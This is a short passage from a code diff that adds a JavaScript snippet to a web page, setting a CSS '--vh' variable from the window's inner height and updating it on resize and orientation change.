+    function setVH() {
+        let vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty('--vh', `${vh}px`);
+    }
+
+    setVH();
+    window.addEventListener('resize', setVH);
+    window.addEventListener('orientationchange', setVH);
+});
+</script>
